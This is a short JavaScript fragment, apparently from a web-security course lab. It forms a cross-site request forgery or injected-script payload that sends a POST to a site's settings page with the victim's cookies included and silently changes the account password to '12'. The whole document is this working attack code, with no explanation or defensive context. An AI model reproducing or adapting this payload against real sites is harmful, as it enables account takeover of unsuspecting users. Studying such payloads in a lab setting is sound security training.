const url = 'https://cats.is-course.ru/settings';
    fetch(url, {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: 'password=12&confirm-password=12'
    });
